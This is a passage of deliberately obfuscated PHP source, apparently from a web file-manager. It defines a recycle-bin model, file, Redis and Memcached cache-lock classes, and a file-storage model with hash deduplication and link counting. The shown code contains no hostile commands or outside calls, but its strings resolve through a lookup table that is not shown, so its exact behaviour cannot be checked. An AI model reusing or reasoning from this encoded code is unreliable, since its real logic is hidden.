"\50{$å¹›Õòã}\x29{$ÆÛ•à»±}"; if (!in_array_not_case($”§—±¼ó, $—ŒèŸÖŠ)) { return $”§—±¼ó; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\165\x72\143\145\137\x72\x65\x63\171\x63\x6c\x65"; protected $dataAuto = array(array("\143\x72\145\141\164\x65\124\151\x6d\145", "\164\151\155\x65", "\151\156\163\x65\x72\x74", "\146\165\x6e\x63\x74\x69\x6f\x6e")); public function listData($«ìö×¸ = false) { $î¤Ò©–Ÿ =& $_SERVER[«òÑğ]; $«ìö×¸ = $«ìö×¸ ? $«ìö×¸ : USER_ID; $Ú†î•”¿ = $this->where(array($î¤Ò©–Ÿ[1775] => $«ìö×¸))->select(); return array_to_keyvalue($Ú†î•”¿, $î¤Ò©–Ÿ[12], $î¤Ò©–Ÿ[194]); } public function moveToRecycle($¾º×ƒÌŞ) { $Ò¹‡öü¨ =& $_SERVER[«òÑğ]; $ŠÏ÷–Éó = Model($Ò¹‡öü¨[1431]); $„Òø¡Ë• = $ŠÏ÷–Éó->sourceInfo($¾º×ƒÌŞ); if (!$„Òø¡Ë• || $„Òø¡Ë•[$Ò¹‡öü¨[508]] == $Ò¹‡öü¨[91]) { return; } $ï²Ÿ ¦ì = array($Ò¹‡öü¨[494] => $¾º×ƒÌŞ, $Ò¹‡öü¨[1775] => USER_ID, $Ò¹‡öü¨[656] => $„Òø¡Ë•[$Ò¹‡öü¨[191]], $Ò¹‡öü¨[657] => $„Òø¡Ë•[$Ò¹‡öü¨[574]], $Ò¹‡öü¨[660] => $„Òø¡Ë•[$Ò¹‡öü¨[589]]); $this->add($ï²Ÿ ¦ì); $this->recycleMove($¾º×ƒÌŞ, 1); if ($„Òø¡Ë•[$Ò¹‡öü¨[488]] == $Ò¹‡öü¨[91]) { $´ŠÒ²àÖ = array($Ò¹‡öü¨[660] => array($Ò¹‡öü¨[620], $„Òø¡Ë•[$Ò¹‡öü¨[589]] . $¾º×ƒÌŞ . $Ò¹‡öü¨[621])); $ŠÏ÷–Éó->where($´ŠÒ²àÖ)->setField($Ò¹‡öü¨[508], 1); } } public function clear() { $this->remove(!1); } public function remove($ğû³òğÎ = false, $«Ü°Ë®ß = false) { $œ³ÅçêŠ =& $_SERVER[«òÑğ]; $«Ü°Ë®ß = $«Ü°Ë®ß ? $«Ü°Ë®ß : USER_ID; $Óƒ™ïûØ = Model($œ³ÅçêŠ[1431]); $§Ô€ö…í = $this->listData($«Ü°Ë®ß); $ğû³òğÎ = $ğû³òğÎ === !1 ? !1 : $ğû³òğÎ; $ÄºŒæ° = array(); foreach ($§Ô€ö…í as $Ä€§‡”) { if ($ğû³òğÎ != !1 && !in_array($Ä€§‡”, $ğû³òğÎ)) { continue; } $áÍ„üÛ = $Óƒ™ïûØ->sourceInfo($Ä€§‡”); $Óƒ™ïûØ->remove($Ä€§‡”, !1); $¸ú¦©ãÆ = $áÍ„üÛ[$œ³ÅçêŠ[191]] . $œ³ÅçêŠ[11] . $áÍ„üÛ[$œ³ÅçêŠ[574]]; $ÄºŒæ°[$¸ú¦©ãÆ] = array($œ³ÅçêŠ[656] => $áÍ„üÛ[$œ³ÅçêŠ[191]], $œ³ÅçêŠ[574] => $áÍ„üÛ[$œ³ÅçêŠ[574]]); $this->where(array($œ³ÅçêŠ[194] => $Ä€§‡”))->delete(); } foreach ($ÄºŒæ° as $ê¨åæÛ’) { $Óƒ™ïûØ->targetSpaceUpdate($ê¨åæÛ’[$œ³ÅçêŠ[191]], $ê¨åæÛ’[$œ³ÅçêŠ[574]]); } } public function restore($Œ´İšŒ‰ = false) { $áºÃ´¡ = $this->listData(); $this->_restoreSource($áºÃ´¡, $Œ´İšŒ‰); } public function removeUserAll($ù¿¢Öí«) { $this->remove(!1, $ù¿¢Öí«); } public function restoreItem($•È§¼§) { $this->_restoreSource(array($•È§¼§), array($•È§¼§)); } private function _restoreSource($ªµĞ¹æ, $°÷İË¤») { $àßØÜ½° =& $_SERVER[«òÑğ]; $±Ï—¾¦× = Model($àßØÜ½°[1431]); $°÷İË¤» = $°÷İË¤» == !1 ? !1 : $°÷İË¤»; if (!$ªµĞ¹æ) { return !0; } $éÛ« ıÅ = array(); foreach ($ªµĞ¹æ as $İ‡ˆ½ıŒ) { if ($°÷İË¤» != !1 && !in_array($İ‡ˆ½ıŒ, $°÷İË¤»)) { continue; } $Š›š• = $±Ï—¾¦×->sourceInfo($İ‡ˆ½ıŒ); $Ú÷Ô„âş = $±Ï—¾¦×->sourceInfo($Š›š•[$àßØÜ½°[193]]); if ($Ú÷Ô„âş[$àßØÜ½°[508]] == $àßØÜ½°[91]) { continue; } $±Ï—¾¦×->lockMoveStart($İ‡ˆ½ıŒ); $this->recycleMove($İ‡ˆ½ıŒ, 0); if ($Š›š•[$àßØÜ½°[488]] == $àßØÜ½°[91]) { $“®£Èòª = array($àßØÜ½°[660] => array($àßØÜ½°[620], $Š›š•[$àßØÜ½°[589]] . $İ‡ˆ½ıŒ . $àßØÜ½°[621])); $±Ï—¾¦×->where($“®£Èòª)->setField($àßØÜ½°[508], 0); $this->restoreFolderChildren($İ‡ˆ½ıŒ, $ªµĞ¹æ); } $this->where(array($àßØÜ½°[194] => $İ‡ˆ½ıŒ))->delete(); $±Ï—¾¦×->folderSizeReset($Š›š•[$àßØÜ½°[193]]); $éÛ« ıÅ[] = $Š›š•[$àßØÜ½°[193]]; if ($Š›š•[$àßØÜ½°[488]] == $àßØÜ½°[91]) { $éÛ« ıÅ[] = $İ‡ˆ½ıŒ; } $±Ï—¾¦×->lockMoveEnd($İ‡ˆ½ıŒ); } $±Ï—¾¦×->updateModifyTime($éÛ« ıÅ); } private function restoreFolderChildren($±¢–ˆã›, $å”ÍÑûˆ) { $‚ö¨Ï•Ğ =& $_SERVER[«òÑğ]; $ğé§«Îô = Model($‚ö¨Ï•Ğ[1431]); $ÜªÏáÂ = array($‚ö¨Ï•Ğ[194] => array($‚ö¨Ï•Ğ[7], array())); foreach ($å”ÍÑûˆ as $¾‘ÖÎŞÌ) { if ($¾‘ÖÎŞÌ == $±¢–ˆã›) { continue; } if (!$ğé§«Îô->isParentOf($±¢–ˆã›, $¾‘ÖÎŞÌ)) { continue; } $»¹öœğ– = $ğé§«Îô->sourceInfo($¾‘ÖÎŞÌ); if ($»¹öœğ–[$‚ö¨Ï•Ğ[488]] == $‚ö¨Ï•Ğ[91]) { $ÜªÏáÂ[] = array($‚ö¨Ï•Ğ[660] => array($‚ö¨Ï•Ğ[620], $»¹öœğ–[$‚ö¨Ï•Ğ[589]] . $¾‘ÖÎŞÌ . $‚ö¨Ï•Ğ[621])); } else { $ÜªÏáÂ[$‚ö¨Ï•Ğ[194]][1][] = $¾‘ÖÎŞÌ; } } if (!$ÜªÏáÂ[$‚ö¨Ï•Ğ[194]][1]) { unset($ÜªÏáÂ[$‚ö¨Ï•Ğ[194]]); } if (!$ÜªÏáÂ) { return; } if (is_array($ÜªÏáÂ[$‚ö¨Ï•Ğ[194]]) && is_array($ÜªÏáÂ[$‚ö¨Ï•Ğ[194]][1])) { $ÜªÏáÂ[$‚ö¨Ï•Ğ[194]][1] = array_unique($ÜªÏáÂ[$‚ö¨Ï•Ğ[194]][1]); } $ÜªÏáÂ[$‚ö¨Ï•Ğ[1087]] = $‚ö¨Ï•Ğ[2087]; $ğé§«Îô->where($ÜªÏáÂ)->setField($‚ö¨Ï•Ğ[508], 1); } private function recycleMove($€à¹«µš, $±¼ÍÕœ² = 1) { $°èœá“› =& $_SERVER[«òÑğ]; $ó¬·®ç¹ = Model($°èœá“›[1431]); $Èç§½“ = Model($°èœá“›[2321]); $¤±é‚¸ô = array($°èœá“›[194] => $€à¹«µš); if ($±¼ÍÕœ²) { $ó¬·®ç¹->where($¤±é‚¸ô)->setField($°èœá“›[508], 1); $Èç§½“->eventRecycle($€à¹«µš, $°èœá“›[2322]); } else { $åàšß = $ó¬·®ç¹->where($¤±é‚¸ô)->find(); $®ø¤çİÌ = $åàšß[$°èœá“›[488]] == $°èœá“›[91]; $æóğÔÀ = $ó¬·®ç¹->fileNameAuto($åàšß[$°èœá“›[193]], $åàšß[$°èœá“›[32]], REPEAT_RENAME_FOLDER, $®ø¤çİÌ); if ($æóğÔÀ != $åàšß[$°èœá“›[32]]) { $ó¬·®ç¹->rename($€à¹«µš, $æóğÔÀ); } $ó¬·®ç¹->where($¤±é‚¸ô)->setField($°èœá“›[508], 0); $Èç§½“->eventRecycle($€à¹«µš, $°èœá“›[2323]); } } } goto A‚Ğ’çĞµà; DÕ„‰‡ËÀÜ: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ˆ·»Ï²â =& $_SERVER[«òÑğ]; $™Ùäë›¸ = $GLOBALS[$ˆ·»Ï²â[6]][$ˆ·»Ï²â[427]]; self::$cachePath = $™Ùäë›¸[$ˆ·»Ï²â[233]][$ˆ·»Ï²â[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($™œ¼¡ìí, $ª·ŒÔ¼Œ = 0) { $Ø·±œ…Â =& $_SERVER[«òÑğ]; $¨¹Üá‘ = microtime(!0); $øø©­‘ˆ = $¨¹Üá‘ + $ª·ŒÔ¼Œ + 0.0001; $£”çÖØ¡ = rtrim(self::$cachePath, $Ø·±œ…Â[8]) . $Ø·±œ…Â[954] . md5($™œ¼¡ìí) . $Ø·±œ…Â[951]; if (file_exists($£”çÖØ¡) && filemtime($£”çÖØ¡) && filemtime($£”çÖØ¡) < time() - 10) { @unlink($£”çÖØ¡); } do { if (file_exists($£”çÖØ¡)) { cacheLockWait(); continue; } $øÆÕÖ·– = fopen($£”çÖØ¡, $Ø·±œ…Â[955]); if (!$øÆÕÖ·–) { return !1; } $Âöä¯” = flock($øÆÕÖ·–, LOCK_EX | LOCK_NB); self::$caches[$™œ¼¡ìí] = array($Ø·±œ…Â[956] => $øÆÕÖ·–, $Ø·±œ…Â[233] => $£”çÖØ¡); fwrite($øÆÕÖ·–, $øø©­‘ˆ); clearstatcache(); if ($øÆÕÖ·– && $Âöä¯”) { return !0; } cacheLockWait(); } while (microtime(!0) < $øø©­‘ˆ); $this->unlock($™œ¼¡ìí); return !1; } public function lockGet($Í×Ö°«à) { $„¢¶Åœ÷ =& $_SERVER[«òÑğ]; $©ŒãèÇÀ = rtrim(self::$cachePath, $„¢¶Åœ÷[8]) . $„¢¶Åœ÷[954] . md5($Í×Ö°«à) . $„¢¶Åœ÷[951]; return file_exists($©ŒãèÇÀ); } public function unlock($€Ğ•¨Ó) { $şøê¦öñ =& $_SERVER[«òÑğ]; $Š°‡¡ê = self::$caches[$€Ğ•¨Ó]; if (!$Š°‡¡ê) { return; } @flock($Š°‡¡ê[$şøê¦öñ[956]], LOCK_UN); @fclose($Š°‡¡ê[$şøê¦öñ[956]]); @unlink($Š°‡¡ê[$şøê¦öñ[233]]); unset(self::$caches[$€Ğ•¨Ó]); } } class CacheLockRedis { public function lock($˜¤¡û—ö, $•¿´ØÖ” = 10) { $©ğòıüË = Cache::init(); $Ä¥†Òİ = microtime(!0) + $•¿´ØÖ”; while (microtime(!0) < $Ä¥†Òİ) { $û˜¯ŸŒÙ = $©ğòıüË->get($˜¤¡û—ö); if (!$û˜¯ŸŒÙ) { $³Íëáø¤ = $©ğòıüË->setLock($˜¤¡û—ö, $Ä¥†Òİ, $•¿´ØÖ”); if ($³Íëáø¤) { return !0; } } else { if ($û˜¯ŸŒÙ < microtime(!0)) { $©ğòıüË->set($˜¤¡û—ö, $Ä¥†Òİ, $•¿´ØÖ” * 2); if ($©ğòıüË->get($˜¤¡û—ö) === $û˜¯ŸŒÙ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ªğ¿½äŞ) { return Cache::init()->get($ªğ¿½äŞ); } public function unlock($êâ–£Å…) { return Cache::init()->remove($êâ–£Å…); } } class CacheLockMemcached { public function lock($¢§îªÔ, $Ü¸ğ‰Ö½ = 0) { $²ñ›•çĞ = Cache::init(); $±åû¥Ã° = microtime(!0) + $Ü¸ğ‰Ö½; while (microtime(!0) < $±åû¥Ã°) { $Ğ¶æØş¯ = $²ñ›•çĞ->get($¢§îªÔ); if (!$Ğ¶æØş¯ || $Ğ¶æØş¯ < microtime(!0)) { $í†ª‹¶É = $²ñ›•çĞ->handle->add($¢§îªÔ, $±åû¥Ã°, $Ü¸ğ‰Ö½); if ($í†ª‹¶É) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Îá¦½‰Š) { return Cache::init()->get($Îá¦½‰Š); } public function unlock($Æ©Îª ) { return Cache::init()->remove($Æ©Îª ); } } goto A‰Ñæ‹Ú¾; CÈ¥§Œ³±ß: class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\x69\154\145"; protected $tableMeta = array("\164\141\142\154\x65\x4e\x61\155\x65" => "\x69\157\137\x66\151\154\x65\137\x6d\145\x74\141", "\x6d\145\x74\x61\x46\151\145\x6c\144" => "\x66\151\154\x65\x49\x44"); public function fileInfo($æÆõ€) { $ÆÄ¾Ã Õ =& $_SERVER[«òÑğ]; static $‘·Å£›Ö = array(); if (!isset($‘·Å£›Ö[$æÆõ€])) { $Ÿ¶×“÷ˆ = $ÆÄ¾Ã Õ[2035]; $“Ô¨ÅĞˆ = Model($ÆÄ¾Ã Õ[549])->field($Ÿ¶×“÷ˆ)->where(array($ÆÄ¾Ã Õ[547] => $æÆõ€))->find(); $‘·Å£›Ö[$æÆõ€] = $“Ô¨ÅĞˆ; } return $‘·Å£›Ö[$æÆõ€]; } public function addFileByContent($¶¯ÔáÈ¸ = '', $†Á²›ì = '') { $ÈÓĞ·Ïå =& $_SERVER[«òÑğ]; $‰ÙşËäú = TEMP_PATH . $ÈÓĞ·Ïå[2036]; if (!is_dir($‰ÙşËäú)) { mk_dir($‰ÙşËäú); } $ûˆùÁêÀ = $‰ÙşËäú . $ÈÓĞ·Ïå[2037] . rand_string(16); $åøÛ§ø = file_put_contents($ûˆùÁêÀ, $¶¯ÔáÈ¸); if ($åøÛ§ø === !1 || strlen($¶¯ÔáÈ¸) != $åøÛ§ø) { return !1; } $Ï÷Í¹ä„ = $this->addFile($ûˆùÁêÀ, $†Á²›ì, !0); if (file_exists($ûˆùÁêÀ)) { @unlink($ûˆùÁêÀ); } return $Ï÷Í¹ä„; } public function createFileName($ô‹Ûñºç, $ï¼Ã€Àš = false, $µéóÑîÙ = false) { $á°óÂú =& $_SERVER[«òÑğ]; $“é±è ñ = IO::init($á°óÂú[8]); $ÆŞÜ¼Òì = $this->makeFilePath($ô‹Ûñºç, $“é±è ñ, $ï¼Ã€Àš, $µéóÑîÙ); $²»íœÂÑ = $“é±è ñ->pathFather($ÆŞÜ¼Òì); static $ÑËÛƒ’² = false; $›Ÿçîı = $á°óÂú[2038] . md5($²»íœÂÑ); if (!$ÑËÛƒ’² && !Cache::get($›Ÿçîı)) { $ÑËÛƒ’² = !0; $ì÷íˆªÅ = IO::mkdir($²»íœÂÑ); if (!IO::exist($ì÷íˆªÅ . $á°óÂú[883])) { IO::mkfile($ì÷íˆªÅ . $á°óÂú[883]); } Cache::set($›Ÿçîı, 1, 3600 * 2); } return $ÆŞÜ¼Òì; } public function makeFilePath($óÔÀ¹û¸, $êÚŞˆ®, $©‚Üğ = false, $Ş²šøú¦ = false) { $”áğ¸ø =& $_SERVER[«òÑğ]; $å¸ÏĞÁÆ = Model($”áğ¸ø[854])->get($”áğ¸ø[2039]); $¡ë«¼Õ¼ = KodIO::defaultIO() . date($”áğ¸ø[2040]); $¥ıœ­›Ø = $¡ë«¼Õ¼ . rand_string(5) . short_id(100); $óÔÀ¹û¸ = str_replace($”áğ¸ø[8], $”áğ¸ø[11], KodIO::clear($óÔÀ¹û¸)); $Ü’æÍõ = $êÚŞˆ®->ext($óÔÀ¹û¸); if (!$óÔÀ¹û¸) { $å¸ÏĞÁÆ = $”áğ¸ø[860]; } switch ($å¸ÏĞÁÆ) { case $”áğ¸ø[2041]: if ($Ü’æÍõ) { $¥ıœ­›Ø = $¥ıœ­›Ø . $”áğ¸ø[10] . $Ü’æÍõ; } if ($Ü’æÍõ == $”áğ¸ø[1977]) { $¥ıœ­›Ø .= $”áğ¸ø[1301]; } break; case $”áğ¸ø[2042]: $Ã…µ ö® = Model($”áğ¸ø[854])->get($”áğ¸ø[855]); $÷¼±äÊ = substr(md5($”áğ¸ø[856] . $Ã…µ ö® . date($”áğ¸ø[833])), 0, 8); $ Œ÷êØ = KodIO::defaultDriver(); $¡ë«¼Õ¼ = $”áğ¸ø[1332] . $ Œ÷êØ[$”áğ¸ø[478]] . $”áğ¸ø[487] . date($”áğ¸ø[2043]) . $÷¼±äÊ . $”áğ¸ø[8]; if ($Ü’æÍõ == $”áğ¸ø[1977]) { $óÔÀ¹û¸ .= $”áğ¸ø[1301]; } $ù¬”× = $”áğ¸ø[2044] . $¡ë«¼Õ¼ . $óÔÀ¹û¸; CacheLock::lock($ù¬”×); $¥ıœ­›Ø = $¡ë«¼Õ¼ . $óÔÀ¹û¸; if (IO::exist($¡ë«¼Õ¼ . $óÔÀ¹û¸)) { $Ï™…íÂ = substr($óÔÀ¹û¸, 0, strlen($óÔÀ¹û¸) - strlen($Ü’æÍõ)); $ª¢±¼Ü© = $Ş²šøú¦ ? substr($Ş²šøú¦, 0, 5) : ($©‚Üğ ? substr($©‚Üğ, 0, 5) : rand_string(5)); $¥ıœ­›Ø = $¡ë«¼Õ¼ . $Ï™…íÂ . $ª¢±¼Ü©; if ($Ü’æÍõ) { $¥ıœ­›Ø = $¥ıœ­›Ø . $”áğ¸ø[10] . $Ü’æÍõ; } } if (IO::isOsDriver($¥ıœ­›Ø) && !IO::isUploadServer($¥ıœ­›Ø)) { if (IO::exist($¥ıœ­›Ø)) { CacheLock::unlock($ù¬”×); return $¥ıœ­›Ø; } $™ÀÅ­–ğ = IO::setContent($¥ıœ­›Ø, $”áğ¸ø[12]); if (!$™ÀÅ­–ğ) { show_json($”áğ¸ø[2045], !1); } } CacheLock::unlock($ù¬”×); break; case $”áğ¸ø[860]: break; default: break; } return $¥ıœ­›Ø; } public function addFileByRemote($Ğğ†àÍ£, $ÁÕûÔÒ•, $ƒØ¡Î£ş = array()) { $ÒãÁï¦… =& $_SERVER[«òÑğ]; if (!IO::exist($Ğğ†àÍ£)) { return !1; } $ëÀïÎ = $ƒØ¡Î£ş[$ÒãÁï¦…[552]] ? $ƒØ¡Î£ş[$ÒãÁï¦…[552]] : $ÒãÁï¦…[12]; $İ¥ïËŒ¨ = IO::hashMd5($Ğğ†àÍ£, $ëÀïÎ); $õ›•—ÅŠ = KodIO::defaultDriver(); $Ûø•‚Ø¨ = array($ÒãÁï¦…[625] => IO::size($Ğğ†àÍ£), $ÒãÁï¦…[2046] => 1, $ÒãÁï¦…[497] => $ÁÕûÔÒ•, $ÒãÁï¦…[897] => $õ›•—ÅŠ[$ÒãÁï¦…[478]], $ÒãÁï¦…[498] => $Ğğ†àÍ£, $ÒãÁï¦…[2047] => $ƒØ¡Î£ş[$ÒãÁï¦…[680]] ? $ƒØ¡Î£ş[$ÒãÁï¦…[680]] : IO::hashSimple($Ğğ†àÍ£), $ÒãÁï¦…[2048] => $İ¥ïËŒ¨ ? $İ¥ïËŒ¨ : $ëÀïÎ); if ($ë†ÄİùË = $this->addFileCheckExist($Ûø•‚Ø¨[$ÒãÁï¦…[680]], $Ûø•‚Ø¨[$ÒãÁï¦…[552]], $Ûø•‚Ø¨[$ÒãÁï¦…[79]])) { return $ë†ÄİùË; } return $this->addFileData($Ûø•‚Ø¨); } private function addFileData($ê¶ÆÄÕ) { $¯ß¸ø«³ =& $_SERVER[«òÑğ]; if (!$ê¶ÆÄÕ) { return !1; } $ê¶ÆÄÕ[$¯ß¸ø«³[79]] = intval($ê¶ÆÄÕ[$¯ß¸ø«³[79]]); if (!$ê¶ÆÄÕ[$¯ß¸ø«³[79]] && strlen($ê¶ÆÄÕ[$¯ß¸ø«³[680]]) > 32) { $ê¶ÆÄÕ[$¯ß¸ø«³[79]] = intval(substr($ê¶ÆÄÕ[$¯ß¸ø«³[680]], 32)); } $ŠàĞî = $this->add($ê¶ÆÄÕ); return $this->find($ŠàĞî); } public function addFile($¿ŸÕ“Ä, $ÍÄ‰´€ë, $Áíä·èÚ = false) { $ì ¬Û·¼ =& $_SERVER[«òÑğ]; $¹Û‰ò’ = IO::hashSimple($¿ŸÕ“Ä); $¢ÑŞè© = IO::size($¿ŸÕ“Ä); $ºÄ†½ = $¢ÑŞè© <= 1024 * 1024 * 10 ? IO::hashMd5($¿ŸÕ“Ä) : $ì ¬Û·¼[12]; $ª¯˜¼‹¾ = $ì ¬Û·¼[2049] . $¹Û‰ò’; CacheLock::lock($ª¯˜¼‹¾); if ($ºÄ†½ && $¹Û‰ò’) { $èÄŞ¥Ğ‚ = $this->addFileCheckExist($¹Û‰ò’, $ºÄ†½, $¢ÑŞè©); if ($èÄŞ¥Ğ‚) { CacheLock::unlock($ª¯˜¼‹¾); return $èÄŞ¥Ğ‚; } } $Ë®ò ş† = $this->addFileMake($¿ŸÕ“Ä, $¢ÑŞè©, $¹Û‰ò’, $ºÄ†½, $ÍÄ‰´€ë, $Áíä·èÚ); $å¥”î« = $this->addFileData($Ë®ò ş†); if (!$å¥”î«) { return !1; } CacheLock::unlock($ª¯˜¼‹¾); if (!$ºÄ†½ && $å¥”î«) { $this->fileMd5Check($å¥”î«); } return $å¥”î«; } public function fileMd5Check($·™€¥åù) { $Ã˜É°Äı =& $_SERVER[«òÑğ]; $´ë˜¸Şù = array($·™€¥åù[$Ã˜É°Äı[546]], $·™€¥åù[$Ã˜É°Äı[87]]); $Ô»Œşæ = $Ã˜É°Äı[2050] . $·™€¥åù[$Ã˜É°Äı[87]]; $íö†õœ™ = $Ã˜É°Äı[2051] . $·™€¥åù[$Ã˜É°Äı[546]]; TaskQueue::add($Ã˜É°Äı[2052], $´ë˜¸Şù, $Ô»Œşæ, $íö†õœ™); } public function fileMd5Set($âÃß‹‡¹, $¾ş¶‹…û) { $ÇÃ©áÛ® =& $_SERVER[«òÑğ]; $Íöè°æÈ = $this->find($âÃß‹‡¹); if (!$Íöè°æÈ || $Íöè°æÈ[$ÇÃ©áÛ®[552]]) { return; } $—©¢¤–‘ = IO::hashMd5($¾ş¶‹…û); if (!$—©¢¤–‘) { return $ÇÃ©áÛ®[12]; } $this->where(array($ÇÃ©áÛ®[546] => $âÃß‹‡¹))->save(array($ÇÃ©áÛ®[552] => $—©¢¤–‘)); } public function addFileMake($’¦†şÚ¥, $ó›øØö†, $ôúáÉªÜ, $»º˜²Í’, $ÈæÉÀ¹ã, $„ü“Ş¿÷) { $ÈÇÛıÂ¬ =& $_SERVER[«òÑğ]; $ä‰Ù‰Ó½ = $this->createFileName($ÈæÉÀ¹ã, $ôúáÉªÜ, $»º˜²Í’); $òÕ•ĞĞˆ = get_path_father($ä‰Ù‰Ó½); $ÛîĞ ¾É = get_path_this($ä‰Ù‰Ó½); if ($„ü“Ş¿÷) { $ñííû° = IO::move($’¦†şÚ¥, $òÕ•ĞĞˆ, !1, $ÛîĞ ¾É); } else { $ñííû° = IO::copy($’¦†şÚ¥, $òÕ•ĞĞˆ, !1, $ÛîĞ ¾É); } if (!$ñííû°) { return !1; } IO::cacheMethod($ÈÇÛıÂ¬[182], $ñííû°, $ÈÇÛıÂ¬[179]); if (IO::size($ñííû°) != $ó›øØö†) { return !1; } $œšä‡â÷ = KodIO::defaultDriver(); $éÔˆÍˆ„ = array($ÈÇÛıÂ¬[625] => $ó›øØö†, $ÈÇÛıÂ¬[2046] => 1, $ÈÇÛıÂ¬[497] => $ÈæÉÀ¹ã, $ÈÇÛıÂ¬[897] => $œšä‡â÷[$ÈÇÛıÂ¬[478]], $ÈÇÛıÂ¬[498] => $ä‰Ù‰Ó½, $ÈÇÛıÂ¬[2047] => $ôúáÉªÜ, $ÈÇÛıÂ¬[2048] => $»º˜²Í’); return $éÔˆÍˆ„; } public function addFileCheckExist($¿ÑŸİĞ², $óŸÇ°¬ñ, $¤Š†¥ºé) { $æú¡«òÑ =& $_SERVER[«òÑğ]; $¼®˜¢Àª = $this->findByHash($¿ÑŸİĞ², $óŸÇ°¬ñ); if (!$¼®˜¢Àª) { return !1; } $¤¾Âùş = array($æú¡«òÑ[2046] => intval($¼®˜¢Àª[$æú¡«òÑ[2053]]) + 1, $æú¡«òÑ[625] => $¤Š†¥ºé); $this->where(array($æú¡«òÑ[547] => $¼®˜¢Àª[$æú¡«òÑ[546]]))->save($¤¾Âùş); return $¼®˜¢Àª; } public function remove($“Ñ–ÊÀ) { $this->linkCountChange($“Ñ–ÊÀ, !1); $this->clearEmpty(); return !0; } public function linkAdd($Ôˆ¤º) { $this->linkCountChange($Ôˆ¤º, !0); } public function linkCountChange($ˆÔ¡¿, $³ŠºÁÅ”) { $ˆÀéÄá¸ =& $_SERVER[«òÑğ]; if (!$ˆÔ¡¿) { return; } if (!is_array($ˆÔ¡¿)) { $ˆÔ¡¿ = array($ˆÔ¡¿); } $ÅºÊì•§ = array(); foreach ($ˆÔ¡¿ as $âë°˜‘Ï) { $à ûà ‚ = $âë°˜‘Ï . $ˆÀéÄá¸[12]; if (!$ÅºÊì•§[$à ûà ‚]) { $ÅºÊì•§[$à ûà ‚] = 0; } $ÅºÊì•§[$à ûà ‚]++; } $´¾š‡™Ñ = array(); foreach ($ÅºÊì•§ as $âë°˜‘Ï => $€•Æé¯Ë) { $à ûà ‚ = $€•Æé¯Ë . $ˆÀéÄá¸[12]; if (!$´¾š‡™Ñ[$à ûà ‚]) { $´¾š‡™Ñ[$à ûà ‚] = array(); } $´¾š‡™Ñ[$à ûà ‚][] = $âë°˜‘Ï; } foreach ($´¾š‡™Ñ as $€•Æé¯Ë => $Î˜”€ÄÛ) { if (!$Î˜”€ÄÛ) { continue; } $€•Æé¯Ë = $³ŠºÁÅ” ? $€•Æé¯Ë : -intval($€•Æé¯Ë); $èƒì‹óì = array($ˆÀéÄá¸[546] => array($ˆÀéÄá¸[7], $Î˜”€ÄÛ)); if ($€•Æé¯Ë < 0) { $èƒì‹óì[$ˆÀéÄá¸[2053]] = array($ˆÀéÄá¸[1102], abs($€•Æé¯Ë)); } $this->where($èƒì‹óì)->setAdd($ˆÀéÄá¸[2053], $€•Æé¯Ë); } } public function findByHash($­Í¬œ‰, $–±ˆ¦Í½ = false) { $Ö¿ïØíˆ =& $_SERVER[«òÑğ]; if (!$­Í¬œ‰ && !$–±ˆ¦Í½) { return !1; } $•£ëıÀ = array($Ö¿ïØíˆ[2047] => $­Í¬œ‰); if ($–±ˆ¦Í½) { $•£ëıÀ = array($Ö¿ïØíˆ[2048] => $–±ˆ¦Í½); } return $this->order($Ö¿ïØíˆ[2054])->where($•£ëıÀ)->find(); } public function clearEmpty($Ì£Ø±Šê = 1) { $ Ù×Öë =& $_SERVER[«òÑğ]; $ì·ŞàĞ = time() - 3600 * 24 * $Ì£Ø±Šê; $î˜†¤Ïƒ = $ Ù×Öë[2055] . $ì·ŞàĞ; $Ş°Ë…ïË = $this->where($î˜†¤Ïƒ)->select(); if (!$Ş°Ë…ïË) { return; } $ÚìºÆô = new Task($ Ù×Öë[2056], $ Ù×Öë[12], count($Ş°Ë…ïË)); foreach ($Ş°Ë…ïË as $äÄ‚§è) { $ÚìºÆô->update(1); $this->resetFile($äÄ‚§è); } $ÚìºÆô->end(); } public function resetFile($²Ò¦ƒâ‹) { $³´ığÑ¸ =& $_SERVER[«òÑğ]; $¸À¨Íü‚ = array($³´ığÑ¸[547] => $²Ò¦ƒâ‹[$³´ığÑ¸[546]]); $‘óãçé = Model($³´ığÑ¸[1431])->where($¸À¨Íü‚)->count(); $…µúùì = Model($³´ığÑ¸[2057])->where($¸À¨Íü‚)->count(); $ì”Æë¶¡ = intval($‘óãçé) + intval($…µúùì); if ($ì”Æë¶¡ == 0) { IO::remove($²Ò¦ƒâ‹[$³´ığÑ¸[87]]); Model($³´ığÑ¸[2058])->delete($²Ò¦ƒâ‹[$³´ığÑ¸[546]]); $this->where($¸À¨Íü‚)->delete(); $this->metaSet($²Ò¦ƒâ‹[$³´ığÑ¸[546]], null, null); write_log(ACTION . $³´ığÑ¸[2059] . KodUser::id() . $³´ığÑ¸[2060] . $²Ò¦ƒâ‹[$³´ığÑ¸[546]] . $³´ığÑ¸[2061] . $²Ò¦ƒâ‹[$³´ığÑ¸[79]] . $³´ığÑ¸[202] . $²Ò¦ƒâ‹[$³´ığÑ¸[87]], $³´ığÑ¸[2062]); return; } if ($²Ò¦ƒâ‹[$³´ığÑ¸[2053]] != $ì”Æë¶¡) { $this->where($¸À¨Íü‚)->save(array($³´ığÑ¸[2046] => $ì”Æë¶¡)); } } public function storageInfo($…¥Ææïõ = false) { $§ƒ«¤ŞÛ =& $_SERVER[«òÑğ]; $´Š¹§å = $this->count() + 0.0; $ğğÑç´ = 0; $¨Ş›éé = 1; $¿’å¨êş = 0; $ê…ş—ô = 5000; for ($ğòãŸ«­ = 0; $ğòãŸ«­ < $´Š¹§å; $ğòãŸ«­ = $ğòãŸ«­ + $ê…ş—ô) { $ø„Éï¸ = $this->limit($ğòãŸ«­, $ğòãŸ«­ + $ê…ş—ô)->select(); foreach ($ø„Éï¸ as $ÜÑË²‚Î) { $¨Ş›éé += $ÜÑË²‚Î[$§ƒ«¤ŞÛ[79]] * $ÜÑË²‚Î[$§ƒ«¤ŞÛ[2053]]; $ğğÑç´ += $ÜÑË²‚Î[$§ƒ«¤ŞÛ[79]] * ($ÜÑË²‚Î[$§ƒ«¤ŞÛ[2053]] - 1); $¿’å¨êş += $ÜÑË²‚Î[$§ƒ«¤ŞÛ[2053]]; } } 